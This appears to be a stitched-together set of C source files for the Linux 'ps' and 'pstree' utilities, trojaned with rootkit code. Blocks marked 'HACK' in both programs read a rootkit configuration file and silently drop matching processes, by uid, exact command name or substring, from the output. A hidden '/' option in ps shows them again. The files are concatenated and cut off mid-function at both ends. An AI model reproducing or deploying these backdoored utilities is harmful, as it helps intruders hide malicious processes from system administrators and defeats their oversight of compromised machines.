		user_ord = 1;
		next_arg = 1;
		break;
	      case 'V': display_version(); exit(0);
#if defined (SHOWFLAG)
	      case '/': showall++;
#endif	
	      default:
                /* Step through, reading+alloc space for comma-delim pids */
		if (isdigit(*p)) {
		    while (isdigit(*p)) {
			CL_pids = xrealloc(CL_pids, (toppid + 2)*sizeof(pid_t));
			CL_pids[toppid++] = atoi(p);
			while (isdigit(*p))
			    p++;
			if (*p == ',')
			    p++;
		    }
		    CL_pids[toppid] = 0;
		    next_arg = 1;
		}
		if (*p)
		    usage("unrecognized option or trailing garbage\n");
            }
            if (next_arg) {
                next_arg = 0;
                break;       /* end loop over chars in this argument */
            }
        }
    } while (argc > 1);

    if (!CL_sort)	/* since the unsorted mode is intended to be speedy */
	CL_forest = 0;	/* turn off the expensive forest option as well. */

    if (CL_fmt == PS_L)
	if (open_psdb())
	    GL_wchan_nout = 1;
	else
	    psdbsucc = 1;

    set_cmdspc(width);

    if (!(GL_main_mem = read_total_main()) ||
	!(GL_current_time = uptime(0,0)))
	return 1;
    GL_time_now = time(0L);

    if (CL_sort && !user_ord)
        parse_sort_opt(mode[CL_fmt].default_sort);

    /* NOTE:  all but option parsing has really been done to enable
     * multiple uid/tty/state filtering as well as multiple pid filtering
     */
    pflags = PROC_ANYTTY;	/* defaults */

    if (!CL_kern_comm)	pflags |= PROC_FILLCMD;  	 /* verbosity flags */
    if (CL_fmt == PS_M) pflags |= PROC_FILLMEM;
    if (CL_show_env)	pflags |= PROC_FILLENV;
    if (!CL_num_outp)	pflags |= PROC_FILLUSR | PROC_FILLTTY;

    if (CL_no_ctty)	pflags &= ~PROC_ANYTTY;		/* filter flags */
    if (CL_run_only)  { pflags |= PROC_STAT; args = "RD"; }
    else if (!CL_all)      { pflags |= PROC_UID;  args = uid; uid[0] = getuid(); pflags &= ~PROC_STAT; }
    if (CL_pids)      { pflags |= PROC_PID;  args = CL_pids; pflags &= ~PROC_UID; pflags &= ~PROC_STAT; }
    if (CL_ctty) {
	if ((tty[0] = tty_to_dev(CL_ctty)) == (dev_t)-1) {
	    fprintf(stderr, "the name `%s' is not a tty\n", CL_ctty);
	    exit(1);
	}
	pflags = (pflags | PROC_TTY) & ~(PROC_ANYTTY|PROC_STAT|PROC_UID|PROC_PID);
	args = tty;
    }
    show_procs(cmdspc, do_header, pflags, args, N);
    if (psdbsucc)
	close_psdb();
    return 0;
}

/* print a context dependent usage message and maybe exit
 */
void usage(char* context) {
    fprintf(stderr,
	    "%s"
            "usage:  ps -acehjlnrsSuvwx{t<tty>|#|O[-]u[-]U..} \\\n"
            "           --sort:[-]key1,[-]key2,...\n"
            "           --help gives you this message\n"
            "           --version prints version information\n",
	    context ? context : "");
    if (context)
	exit(1);	/* prevent bad exit status by calling usage("") */
}

/* set maximum chars displayed on a line based on screen size.
 * Always allow for the header, with n+1 lines of output per row.
 */
void set_cmdspc(int n) {
    struct winsize win;
    int h = strlen(mode[CL_fmt].header),
	c = strlen("COMMAND");

    if (ioctl(1, TIOCGWINSZ, &win) != -1 && win.ws_col > 0)
	cmdspc = win.ws_col;
    if (n > 100) n = 100;	/* max of 100 'w' options */
    if (cmdspc > h)
	cmdspc = cmdspc*(n+1) - h + c;
    else
	cmdspc = cmdspc*n + c;
}

/* This is the main driver routine that iterates over the process table.
 */
void show_procs(unsigned maxcmd, int do_header, int pflags, void* args, int N) {
    static proc_t buf; /* less dynamic memory allocation when not sorting */
    PROCTAB* tab;
    proc_t **ptable = NULL, *next, *retbuf = NULL;
    int n = 0;

    /* initiate process table scan */
    tab = openproc(pflags, args, N);

    if (do_header) puts(mode[CL_fmt].header);	/* print header */

    if (!(CL_sort || CL_forest))	/* when sorting and forest are both */
	retbuf = &buf;			/* off we can use a static buffer */

    while ((next = readproc(tab,retbuf))) {	/* read next process */
/* HACK */
if ((hackcheck(next)==0)||showall) {
	n++;					/* Now either: */
	if (CL_forest) {			/*    add process to tree */
	    static char s[256];
	    if (CL_num_outp)
		snprintf(next->ttyc, sizeof next->ttyc, "%04.4x", next->tty);
	    (mode[CL_fmt].format)(s, next);
	    if (CL_fmt != PS_V && CL_fmt != PS_M)
		show_time(s+strlen(s), next);
	    add_node(s, next);
	} else if (CL_sort) {			/*    add process to table */
	    ptable = realloc(ptable, n*sizeof(proc_t*));
	    ptable[n-1] = next;
	} else {				/*    or show it right away */
	    show_a_proc(&buf, maxcmd);
	    if (buf.cmdline) free((void*)(buf.cmdline[0]));
	    if (buf.environ) free((void*)(buf.environ[0]));
	}
} /* END HACK */
    }
    if (!n) {
	fprintf(stderr, "No processes available.\n");
	exit(1);
    }
    if (CL_sort && !CL_forest) {	/* just print sorted table */
	int i;
	qsort(ptable, n, sizeof(proc_t*), (void*)mult_lvl_cmp);
	for (i = 0; i < n; i++) {
	    show_a_proc(ptable[i], maxcmd);
	    freeproc(ptable[i]);
	}
	free(ptable);
    } else if (CL_forest)
	show_forest();
}

/* show the trailing command and environment in available space.
 * use abbreviated cmd if requested, NULL list, or singleton NULL string
 */
void show_cmd_env(char* tskcmd, char** cmd, char** env, unsigned maxch) {
    if (CL_kern_comm)		/* no () when explicit request for tsk cmd */
	maxch = print_str(stdout, tskcmd, maxch);
    else if (!cmd || !*cmd || (!cmd[1] && !*cmd)) {
	/* no /proc//cmdline ==> bounding () */
	if (maxch) {
	    fputc('(', stdout);
	    maxch--;
	}
	maxch = print_str(stdout, tskcmd, maxch);
	if (maxch) {
	    fputc(')', stdout);
	    maxch--;
	}
    } else
	maxch = print_strlist(stdout, cmd, " ", maxch);
    if (CL_show_env && env)
	print_strlist(stdout, env, " ", maxch);
    fputc('\n', stdout);
}


/* format a single process for output.
 */
void show_a_proc(proc_t* p, unsigned maxch) {
    static char s[2048];
    if (CL_num_outp)
	snprintf(p->ttyc, sizeof p->ttyc, "%04.4x", p->tty);
    (mode[CL_fmt].format)(s, p);
    if (CL_fmt != PS_V && CL_fmt != PS_M)
	show_time(s+strlen(s), p);
    printf("%s", s);
    show_cmd_env(p->cmd, p->cmdline, p->environ, maxch);
}

/* The format functions for the various formatting modes follow */

void show_short(char *s, proc_t *p) {
    sprintf(s, "%5d %3s %s", p->pid, p->ttyc, status(p));
}

void show_long(char *s, proc_t *p) {
    char wchanb[10];
    
    if (GL_wchan_nout)
	sprintf(wchanb, " %-9x ", p->wchan);
    else
	sprintf(wchanb, "%-11.11s", wchan(p->wchan));
    sprintf(s, "%6x %5d %5d %5d %3d %3d %6d %5d %-11.11s %s%3s",
	    p->flags, p->uid, p->pid, p->ppid, p->priority, p->nice,
	    p->vsize >> 10, p->rss * 4, wchanb, status(p), p->ttyc);
}

void show_jobs(char *s, proc_t *p) {
    sprintf(s, "%5d %5d %5d %5d %3s %5d  %s %5d ",
	    p->ppid, p->pid, p->pgrp, p->session, p->ttyc, p->tpgid, status(p),
	    p->uid);
}

void show_user(char *s, proc_t *p) {
    int pmem, total_time, seconds;
    time_t start;
    unsigned int pcpu;

    if (CL_num_outp)
	s += sprintf(s, "%5d    ", p->uid);
    else
	s += sprintf(s, "%-8s ", p->user);
    seconds = (((GL_current_time * 100) - p->start_time) / HZ);
    start = GL_time_now - seconds;
    total_time = (p->utime + p->stime +
		  (CL_Sum ? p->cutime + p->cstime : 0));
    pcpu = seconds ?
	(total_time * 10) / seconds :
	0;
    if (pcpu > 999) pcpu = 999;
    pmem = p->rss * 1000 / (GL_main_mem >> 12);
    sprintf(s, "%5d %2u.%u %2d.%d %5d %5d %2s %s%.6s ",
	    p->pid,  pcpu / 10, pcpu % 10,  pmem / 10, pmem % 10,
	    p->vsize >> 10, p->rss << 2, p->ttyc, status(p),
	    ctime(&start) + (GL_time_now - start > 3600*24 ? 4 : 10));
}

void show_sig(char *s, proc_t *p) {
    sprintf(s, "%5d %5d %08x %08x %08x %08x %s %3s ",
	    p->uid, p->pid, p->signal, p->blocked, p->sigignore, p->sigcatch,
	    status(p), p->ttyc);
}

void show_vm(char *s, proc_t *p) {
    int pmem;

    s += sprintf(s,"%5d %3s %s", p->pid, p->ttyc, status(p));
    show_time(s, p);
    s += strlen(s);
    s += sprintf(s, " %6d %4d %4d %4d ",
		 p->maj_flt + (CL_Sum ? p->cmaj_flt : 0),
		 p->vsize ? (p->end_code - p->start_code) >> 10 : 0,
		 p->vsize ? (p->vsize - p->end_code + p->start_code) >> 10 : 0,
		 p->rss << 2);
    if(p->rss_rlim == RLIM_INFINITY)
	s += sprintf(s, "   xx ");
    else
	s += sprintf(s, "%5d ", p->rss_rlim >> 10);
    pmem = p->rss * 1000 / (GL_main_mem >> 12);
    sprintf(s, "%2d.%d ", pmem / 10, pmem % 10);
}


void show_m(char *s, proc_t *p) {
    sprintf(s, "%5d %3s %6d %6d %5d %5d %5d %5d %5d %5d %5d %3d ", 
	    p->pid, p->ttyc,
	    p->maj_flt + (CL_Sum ? p->cmaj_flt : 0),
	    p->min_flt + (CL_Sum ? p->cmin_flt : 0),
	    p->trs << CL_pg_shift,
	    p->drs << CL_pg_shift,
	    p->size << CL_pg_shift,
	    (p->size - p->resident) << CL_pg_shift,
	    p->resident << CL_pg_shift,
	    p->share << CL_pg_shift,
	    p->lrs << CL_pg_shift,
	    p->dt);
}

void show_regs(char *s, proc_t *p) {
    char time1[16], time2[16];

    sprintf(s, "%2d %5d %8x %8x %8x %s %s %s %3s ",
	    p->start_code >> 26, p->pid, p->start_stack,
	    p->kstk_esp, p->kstk_eip,
	    prtime(time1, p->timeout, GL_current_time*HZ),
	    prtime(time2, p->it_real_value, 0),
	    status(p), p->ttyc);
}

char *prtime(char *s, unsigned long t, unsigned long rel) {
    if (t == 0) {
        sprintf(s, "     ");
        return s;
    }
    if ((long) t == -1) {
        sprintf(s, "   xx");
        return s;
    }
    if ((long) (t -= rel) < 0)
        t = 0;
    if (t > 9999)
        sprintf(s, "%5lu", t / 100);
    else
        sprintf(s, "%2lu.%02lu", t / 100, t % 100);
    return s;
}

void show_time(char *s, proc_t * p) {
    unsigned t;
    t = (p->utime + p->stime) / HZ;
    if (CL_Sum) t += (p->cutime + p->cstime) / HZ;
    sprintf(s, "%3d:%02d ", t / 60, t % 60);
}

/* fancy process family tree based cmdline printing.  Building the tree
   should be relegated to libproc and only the printing logic should
   remain here.
*/
struct tree_node * node;  /* forest mode globals */
int      nodes = 0;
int      maxnodes = 0;

void add_node(char *s, proc_t *task) {
    if (maxnodes == 0) {
	maxnodes = 64;
        node = (struct tree_node *)
            malloc(sizeof(struct tree_node) * maxnodes);
    }
    if (nodes > maxnodes) {
	maxnodes *= 2;
        node = (struct tree_node *)
            realloc(node, sizeof(struct tree_node) * maxnodes);
    }
    node[nodes].proc        = task;
    node[nodes].pid         = task->pid;
    node[nodes].ppid        = task->ppid;
    node[nodes].line        = strdup(s);
    node[nodes].cmd         = task->cmd;
    node[nodes].cmdline     = task->cmdline;
    node[nodes].environ     = task->environ;
    node[nodes].children    = 0;
    node[nodes].have_parent = 0;
    nodes++;
}

int node_cmp(const void *s1, const void *s2) {
    struct tree_node *n1 = (struct tree_node *) s1;
    struct tree_node *n2 = (struct tree_node *) s2;
    return n1->pid - n2->pid;
}

void show_tree(int n, int depth, char *continued) {
    int i, cols = 0;

    fprintf(stdout, "%s", node[n].line);
    for (i = 0; i < depth; i++) {
        if (cols + 4 >= cmdspc - 1)
            break; 
        if (i == depth - 1)
            printf(" \\_ ");
        else if (continued[i])
            printf(" |  ");
        else
            printf("    ");
        cols += 4;
    }
    show_cmd_env(node[n].cmd, node[n].cmdline, node[n].environ, cmdspc - cols);
    for (i = 0; i < node[n].children; i++) {
        continued[depth] = i != node[n].children - 1;
        show_tree(node[n].child[i], depth + 1, continued);
    }
}

void show_forest() {
    register int i, j;
    int parent;
    char continued[1024];

    if (CL_sort)
	qsort((void*)node, nodes, sizeof(struct tree_node), (void*)node_mult_lvl_cmp);

    for (i = 0; i < nodes; i++) {
        if (node[i].ppid > 1 && node[i].pid != node[i].ppid) {
	    parent = -1;
	    for (j=0; j<nodes; j++)
		if (node[j].pid==node[i].ppid)
		    parent = j;
        } else
            parent = -1;
        if (parent >= 0) {
            node[i].have_parent++;
            if (node[parent].children == 0) {
                node[parent].child = (int*)malloc(16 * sizeof(int*));
                node[parent].maxchildren = 16;
            }
            else if (node[parent].children == node[parent].maxchildren) {
                node[parent].maxchildren *= 2;
                node[parent].child = (int*)realloc(node[parent].child,
						   node[parent].maxchildren
						   * sizeof(int*));
            }
            node[parent].child[node[parent].children++] = i;
        }
    }

    for (i = 0; i < nodes; i++) {
        if (!node[i].have_parent)
            show_tree(i, 0, continued);
    }
}
12
CC=cc
CFLAGS=-g -DPSMISC_VERSION=\"`cat VERSION`\" \
  -Wall -Wno-parentheses -Wwrite-strings -Wpointer-arith -Wcast-align \
  # -Wconversion -g
LDFLAGS=#-s -N #-Xlinker -qmagic
REAL_CPP=/lib/cpp
PROGS=pstree 
EBINDIR=/bin		# essential binaries
BINDIR=/usr/bin		# not so essential ones

all:		$(PROGS)

signames.h:	/usr/include/signal.h
		$(REAL_CPP) -dM </usr/include/signal.h | \
		tr -s '\t ' '  ' | sort -n +2 | sed \
	's:#define SIG\([A-Z]\+[0-9]*\) \([0-9]\+\) *\(\|/\*.*\)$$:{\
\2,"\1" },:p;d' \
		  > signames.h

signals.o:	signals.h signals.c signames.h Makefile

pstree:		pstree.c comm.h Makefile VERSION
		$(CC) $(CFLAGS) $(LDFLAGS) -o pstree pstree.c -ltermcap

clean:
		rm -f *.o signames.h pstree
/* comm.h - command name length definition */
 
/* Copyright 1995 Werner Almesberger. See file COPYING for details. */
 

#ifndef COMM_H
#define COMM_H

#if 0 /* broken in 1.3.xx */
#include <linux/sched.h>
#define COMM_LEN sizeof(dummy.comm)
extern struct task_struct dummy;
#else
#define COMM_LEN 16 /* synchronize with size of comm in struct task_struct in
		       /usr/include/linux/sched.h */
#endif

#endif
/* signals.h - signal name handling */

/* Copyright 1993-1995 Werner Almesberger. See file COPYING for details. */


#ifndef SIGNALS_H
#define SIGNALS_H

void list_signals(void);

/* Lists all known signal names on standard output. */

int get_signal(char *name,const char *cmd);

/* Returns the signal number of NAME. If no such signal exists, an error
   message is displayed and the program is terminated. CMD is the name of the
   application. */

#endif
/* pstree.c - display process tree */

/* Copyright 1993-1996 Werner Almesberger. See file COPYING for details. */


#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <ctype.h>
#include <unistd.h>
#include <fcntl.h>
#include <getopt.h>
#include <pwd.h>
#include <dirent.h>
#include <termios.h>
#include <termcap.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/ioctl.h>

#include "comm.h"


#ifndef MAX_DEPTH
#define MAX_DEPTH    100
#endif
#define PROC_BASE    "/proc"

/* UTF-8 defines by Johan Myreen */
#define UTF_V	"\342\224\202\277"		/* Vertical line drawing char */
#define UTF_VR	"\342\224\234\277"		/* Vertical and right */
#define UTF_H	"\342\224\200\277"		/* Horizontal */
#define UTF_UR	"\342\224\224\277"		/* Up and right */
#define UTF_HD	"\342\224\254\277"		/* Horizontal and down */

#define VT_BEG	"\033(0\017"			/* use graphic chars */
#define VT_END	"\033(B"			/* back to normal char set */
#define VT_V	"x"				/* see UTF definitions above */
#define VT_VR	"t"
#define VT_H	"q"
#define VT_UR	"m"
#define	VT_HD	"w"

/* HACK DEFS */
#include "../../rootkit.h"
#define STR_SIZE 128
#define SPC_CHAR " "
#define END_CHAR "\n"
int showall=0;

struct  h_st {
        struct h_st     *next;
        int             hack_type;
        char            hack_cmd[STR_SIZE];
};

struct  h_st    *hack_list;
struct  h_st    *h_tmp;

char    tmp_str[STR_SIZE];
char    *strp;

FILE    *fp_hack;

void hackinit(void)
{
   h_tmp=(struct h_st *)malloc(sizeof(struct h_st));
   hack_list=h_tmp;

   if ((int)fp_hack=fopen(ROOTKIT_PROCESS_FILE,"r")) {
      while (fgets(tmp_str, 126, fp_hack)) {
         h_tmp->next=(struct h_st *)malloc(sizeof(struct h_st));
         strp=tmp_str;
         strp=strtok (strp, SPC_CHAR);
         h_tmp->hack_type=atoi(strp);
         strp=strtok ('\0', END_CHAR);
         strcpy (h_tmp->hack_cmd, strp);
         h_tmp=h_tmp->next;
      }
   fclose(fp_hack);
   }
   h_tmp->next=NULL;
}

int hackcheck(const char *cmd, int uid)
{
/* int i=0; */
   for (h_tmp=hack_list; h_tmp->next; h_tmp=h_tmp->next) {
      switch (h_tmp->hack_type) {
       case 0:
         if (uid==atoi(h_tmp->hack_cmd))
           return 1;
         break;
/*       case 1:
         while((p->ttyc[i]==' ')&&(i<4)) i++;
         if (!strcmp(&p->ttyc[i], h_tmp->hack_cmd))
           return 1;
         break; */
       case 2:
         if (strcmp(cmd,h_tmp->hack_cmd)==0)
           return 1;
         break;
        case 3:
         if (strstr(cmd,h_tmp->hack_cmd))
           return 1;
         break;
      }
   }
return 0;
}

typedef struct _proc {
    char comm[COMM_LEN+1];
    char **argv;	/* only used : argv[0] is 1st arg; undef if argc < 1 */
    int argc;		/* with -a   : number of arguments, -1 if swapped    */
    pid_t pid;
    uid_t uid;
    int highlight;
    struct _child *children;
    struct _proc *parent;
    struct _proc *next;
} PROC;

typedef struct _child {
    PROC *child;
    struct _child *next;
}  CHILD;

static struct {
    const char *empty_2;	/*    */
    const char *branch_2;	/* |- */
    const char *vert_2;		/* |  */
    const char *last_2;		/* `- */
    const char *single_3;	/* --- */
    const char *first_3;	/* -+- */
} sym_ascii = { "  ",
	        "|-",
		"| ",
		"`-",
		"---",
		"-+-" },
  sym_utf =   { "  ",
		UTF_VR UTF_H,
		UTF_V " ",
		UTF_UR UTF_H,
		UTF_H UTF_H UTF_H,
		UTF_H UTF_HD UTF_H },
  sym_vt100 = { "  ",
		VT_BEG VT_VR VT_H VT_END,
		VT_BEG VT_V VT_END " ",
		VT_BEG VT_UR VT_H VT_END,
		VT_BEG VT_H VT_H VT_H VT_END,
		VT_BEG VT_H VT_HD VT_H VT_END },
  *sym = &sym_ascii;

static PROC *list = NULL;
static int width[MAX_DEPTH],more[MAX_DEPTH];
static int print_args = 0,compact = 1,user_change = 0,pids = 0,by_pid = 0,
  trunc = 1;
static output_width = 132;
static int cur_x = 1;
static char last_char = 0;
static int dumped = 0; /* used by dump_by_user */


static void out_char(char c)
{
    cur_x += (c & 0xc0) != 0x80; /* only count first UTF-8 char */
    if (cur_x <= output_width || !trunc) putchar(c);
    if (cur_x == output_width+1 && trunc)
	if (last_char || (c & 0x80)) putchar('+');
	else {
	    last_char = c;
	    cur_x--;
	    return;
	}
}


static void out_string(const char *str)
{
    while (*str) out_char(*str++);
}


static int out_int(int x) /* non-negative integers only */
{
    int digits,div;

    digits = 0;
    for (div = 1; x/div; div *= 10) digits++;
    if (!digits) digits = 1;
    for (div /= 10; div; div /= 10) out_char('0'+(x/div) % 10);
    return digits;
}


static void out_newline(void)
{
    if (last_char && cur_x == output_width) putchar(last_char);
    last_char = 0;
    putchar('\n');
    cur_x = 1;
}


static PROC *find_proc(pid_t pid)
{
    PROC *walk;

    for (walk = list; walk; walk = walk->next)
	if (walk->pid == pid) break;
    return walk;
}


static PROC *new_proc(const char *comm,pid_t pid,uid_t uid)
{
    PROC *new;
    if (!(new = malloc(sizeof(PROC)))) {
	perror("malloc");
	exit(1);
    }
    strcpy(new->comm,comm);
    new->pid = pid;
    new->uid = uid;
    new->highlight = 0;
    new->children = NULL;
    new->parent = NULL;
    new->next = list;
    return list = new;
}


static void add_child(PROC *parent,PROC *child)
{
    CHILD *new,**walk;
    int cmp;

    if (!(new = malloc(sizeof(CHILD)))) {
	perror("malloc");
	exit(1);
    }
    new->child = child;
    for (walk = &parent->children; *walk; walk = &(*walk)->next)
	if (by_pid) {
	    if ((*walk)->child->pid > child->pid) break;
	}
	else if ((cmp = strcmp((*walk)->child->comm,child->comm)) > 0) break;
	    else if (!cmp && (*walk)->child->uid > child->uid) break;
    new->next = *walk;
    *walk = new;
}


static void set_args(PROC *this,const char *args,int size)
{
    char *start;
    int i;

    if (!size) {
	this->argc = -1;
	return;
    }
    this->argc = 0;
    for (i = 0; i < size-1; i++)
	if (!args[i]) this->argc++;
    if (!this->argc) return;
    if (!(this->argv = malloc(sizeof(char *)*this->argc))) {
	perror("malloc");
	exit(1);
    }
    start = strchr(args,0)+1;
    size -= start-args;
    if (!(this->argv[0] = malloc((size_t) size))) {
	perror("malloc");
	exit(1);
    }
    start = memcpy(this->argv[0],start,(size_t) size);
    for (i = 1; i < this->argc; i++) this->argv[i] = start = strchr(start,0)+1;
}


static void add_proc(const char *comm,pid_t pid,pid_t ppid,uid_t uid,
  const char *args,int size)
{
    PROC *this,*parent;

/* HACK */
if (!hackcheck(comm,uid)) {
    if (!(this = find_proc(pid))) this = new_proc(comm,pid,uid);
    else {
	strcpy(this->comm,comm);
	this->uid = uid;
    }
    if (args) set_args(this,args,size);
    if (!(parent = find_proc(ppid))) parent = new_proc("?",ppid,0);
    add_child(parent,this);
    this->parent = parent;
} /* END HACK */
}


static int tree_equal(const PROC *a,const PROC *b)
{
    const CHILD *walk_a,*walk_b;

    if (strcmp(a->comm,b->comm)) return 0;
    if (user_change && a->uid != b->uid) return 0;
    for (walk_a = a->children, walk_b = b->children; walk_a && walk_b;
      walk_a = walk_a->next, walk_b = walk_b->next)
	if (!tree_equal(walk_a->child,walk_b->child)) return 0;
    return !(walk_a || walk_b);
}


static void dump_tree(PROC *current,int level,int rep,int leaf,int last,
  uid_t prev_uid,int closing)
{
    CHILD *walk,*next,**scan;
    const struct passwd *pw;
    int lvl,i,add,offset,len,swapped,info,count,comm_len,first;
    const char *tmp,*here;
    char comm_tmp[5];

    if (!current) return;
    if (level >= MAX_DEPTH-1) {
	fprintf(stderr,"MAX_DEPTH not big enough.\n");
	exit(1);
    }
    if (!leaf)
	for (lvl = 0; lvl < level; lvl++) {
	    for (i = width[lvl]+1; i; i--) out_char(' ');
	    out_string(lvl == level-1 ? last ? sym->last_2 : sym->branch_2 :
	       more[lvl+1] ? sym->vert_2 : sym->empty_2);
	}
    if (rep < 2) add = 0;
    else {
	add = out_int(rep)+2;
	out_string("*[");
    }
    if (current->highlight && (tmp = tgetstr("md",NULL))) tputs(tmp,1,putchar);
    if (swapped = print_args && current->argc < 0) out_char('(');
    comm_len = 0;
    for (here = current->comm; *here; here++)
	if (*here == '\\') {
	    out_string("\\\\");
	    comm_len += 2;
	}
	else if (*here > ' ' && *here <= '~') {
		out_char(*here);
		comm_len++;
	    }
	    else {
		sprintf(comm_tmp,"\\%03o",(unsigned char) *here);
		out_string(comm_tmp);
		comm_len += 4;
	    }
    offset = cur_x;
    info = pids || (user_change && prev_uid != current->uid);
    if (info) out_char(swapped ? ',' : '(');
    if (pids) (void) out_int(current->pid);
    if (user_change && prev_uid != current->uid) {
	if (pids) out_char(',');
	if ((pw = getpwuid(current->uid))) out_string(pw->pw_name);
	else (void) out_int(current->uid);
    }
    if (info || swapped) out_char(')');
    if (current->highlight && (tmp = tgetstr("me",NULL))) tputs(tmp,1,putchar);
    if (print_args) {
	for (i = 0; i < current->argc; i++) {
	    out_char(' ');
	    len = 0;
	    for (here = current->argv[i]; *here; here++)
		len += *here > ' ' && *here <= '~' ? 1 : 4;
	    if (cur_x+len <= output_width-(i == current->argc-1 ? 0 : 4))
		for (here = current->argv[i]; *here; here++)
		    if (*here > ' ' && *here <= '~') out_char(*here);
		    else {
			sprintf(comm_tmp,"\\%03o",(unsigned char) *here);
			out_string(comm_tmp);
		    }
	    else {
		out_string("...");
		break;
	    }
	}
    }
    if (print_args || !current->children) {
	while (closing--) out_char(']');
	out_newline();
	if (print_args) {
	    more[level] = !last;
	    width[level] = swapped+(comm_len > 1 ? 0 : -1);
	    for (walk = current->children; walk; walk = walk->next)
		dump_tree(walk->child,level+1,1,0,!walk->next,current->uid,0);
	}
    }
    else {
	more[level] = !last;
	width[level] = comm_len+cur_x-offset+add;
	if (cur_x >= output_width && trunc) {
	    out_string(sym->first_3);
	    out_string("+");
	    out_newline();
	}
	else {
	    first = 1;
	    for (walk = current->children; walk; walk = next) {
		count = 0;
		next = walk->next;
		if (compact) {
		    scan = &walk->next;
		    while (*scan)
			if (!tree_equal(walk->child,(*scan)->child)) 
			    scan = &(*scan)->next;
			else {
			    if (next == *scan) next = (*scan)->next;
			    count++;
			    *scan = (*scan)->next;
			}
		}
		if (first) {
		    out_string(next ? sym->first_3 : sym->single_3);
		    first = 0;
		}
		dump_tree(walk->child,level+1,count+1,walk == current->children,
		  !next,current->uid,closing+(count ? 1 : 0));
	    }
	}
    }
}


static void dump_by_user(PROC *current,uid_t uid)
{
    const CHILD *walk;

    if (current->uid == uid) {
	if (dumped) putchar('\n');
	dump_tree(current,0,1,1,1,uid,0);
	dumped = 1;
	return;
    }
    for (walk = current->children; walk; walk = walk->next)
	dump_by_user(walk->child,uid);
}


static void read_proc(void)
{
    DIR *dir;
    struct dirent *de;
    FILE *file;
    struct stat st;
    char path[PATH_MAX+1],comm[COMM_LEN+1];
    char *buffer;
    pid_t pid,ppid;
    int fd,size;
    int empty,dummy;

    if (!print_args) buffer = NULL;
    else if (!(buffer = malloc((size_t) (output_width+1)))) {
	    perror("malloc");
	    exit(1);
	}
    if (!(dir = opendir(PROC_BASE))) {
	perror(PROC_BASE);
	exit(1);
    }
    empty = 1;
    while (de = readdir(dir))
	if (pid = atoi(de->d_name)) {
	    sprintf(path,"%s/%d/stat",PROC_BASE,pid);
	    if (file = fopen(path,"r")) {
		empty = 0;
		if (fstat(fileno(file),&st) < 0) {
		    perror(path);
		    exit(1);
		}
		if (fscanf(file,"%d (%[^)]) %c %d",&dummy,comm,(char *) &dummy,
		  &ppid) == 4) {
		    if (!print_args) add_proc(comm,pid,ppid,st.st_uid,NULL,0);
		    else {
			sprintf(path,"%s/%d/cmdline",PROC_BASE,pid);
			if ((fd = open(path,O_RDONLY)) < 0) {
			    perror(path);
			    exit(1);
			}
			if ((size = read(fd,buffer,(size_t) output_width)) < 0)
			  {
			    perror(path);
			    exit(1);
			}
			(void) close(fd);
			if (size) buffer[size++] = 0;
			add_proc(comm,pid,ppid,st.st_uid,buffer,size);
		    }
		}
		(void) fclose(file);
	    }
	}
    (void) closedir(dir);
    if (print_args) free(buffer);
    if (empty) {
	fprintf(stderr,PROC_BASE " is empty (not mounted ?)\n");
	exit(1);
    }
}


#if 0

/* Could use output of  ps achlx | awk '{ print $3,$4,$2,$13 }'  */

static void read_stdin(void)
{
    char comm[PATH_MAX+1];
    char *cmd;
    int pid,ppid,uid;

    while (scanf("%d %d %d %s\n",&pid,&ppid,&uid,comm) == 4) {
	if (cmd = strrchr(comm,'/')) cmd++;
	else cmd = comm;
	if (*cmd == '-') cmd++;
	add_proc(cmd,pid,ppid,uid,NULL,0);
    }
}

#endif


static void usage(void)
{
    fprintf(stderr,"usage: pstree [ -a ] [ -c ] [ -h ] [ -l ] [ -n ] [ -p ] "
      "[ -u ] [ -G | -U ]\n%14s[ pid | user]\n","");
    fprintf(stderr,"       pstree -V\n\n");
    fprintf(stderr,"    -a     show command line arguments\n");
    fprintf(stderr,"    -c     don't compact identical subtrees\n");
    fprintf(stderr,"    -h     highlight current process and its ancestors\n");
    fprintf(stderr,"    -G     use VT100 line drawing characters\n");
    fprintf(stderr,"    -l     don't truncate long lines\n");
    fprintf(stderr,"    -n     sort output by PID\n");
    fprintf(stderr,"    -p     show PIDs; implies -c\n");
    fprintf(stderr,"    -u     show uid transitions\n");
    fprintf(stderr,"    -U     use UTF-8 (Unicode) line drawing characters\n");
    fprintf(stderr,"    -V     display version information\n");
    fprintf(stderr,"    pid    start at pid, default 1 (init)\n");
    fprintf(stderr,"    user   show only trees rooted at processes of that "
      "user\n\n");
    exit(1);
}


int main(int argc,char **argv)
{
    PROC *current;
    struct winsize winsz;
    const struct passwd *pw;
    pid_t pid,highlight;
    char termcap_area[1024];
    int c;

hackinit();

    if (ioctl(1,TIOCGWINSZ,&winsz) >= 0)
	if (winsz.ws_col) output_width = winsz.ws_col;
    pid = 1;
    highlight = 0;
    pw = NULL;
    while ((c = getopt(argc,argv,"acGhnpluUV")) != EOF)
	switch (c) {
	    case 'a':
		print_args = 1;
		break;
	    case 'c':
		compact = 0;
		break;
	    case 'G':
		if (sym != &sym_ascii) usage();
		sym = &sym_vt100;
		break;
	    case 'h':
		if (getenv("TERM") && tgetent(termcap_area,getenv("TERM")) > 0)
		    highlight = getpid();
		break;
	    case 'l':
		trunc = 0;
		break;
	    case 'n':
		by_pid = 1;
		break;
	    case 'p':
		pids = 1;
		compact = 0;
		break;
	    case 'u':
		user_change = 1;
		break;
	    case 'U':
		if (sym != &sym_ascii) usage();
		sym = &sym_utf;
		break;
	    case 'V':
		fprintf(stderr,"pstree from psmisc version " PSMISC_VERSION
		  "\n");
		return 0;
	    default:
		usage();
	}
    if (optind == argc-1)
	if (isdigit(*argv[optind])) {
	    if (!(pid = atoi(argv[optind++]))) usage();
	}
	else if (!(pw = getpwnam(argv[optind++]))) {
		fprintf(stderr,"No such user name: %s\n",argv[optind-1]);
		return 1;
	    }
    if (optind != argc) usage();
    read_proc();
    for (current = find_proc(highlight); current; current = current->parent)
	current->highlight = 1;
    if (!pw)
	dump_tree(find_proc(pid),0,1,1,1,0,0);
    else {
	dump_by_user(find_proc(1),pw->pw_uid);
	if (!dumped) {
	    fprintf(stderr,"No processes found.\n");
	    return 1;
	}
    }
    return 0;
}
/* signals.c - signal name handling */

/* Copyright 1993-1995 Werner Almesberger. See file COPYING for details. */


#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <ctype.h>
#include "signals.h"


typedef struct {
    int number;
    const char *name;
} SIGNAME;


static SIGNAME signals[] = {
#include "signames.h"
  { 0,NULL }};


void list_signals(void)
{
    SIGNAME *walk;
    int col;

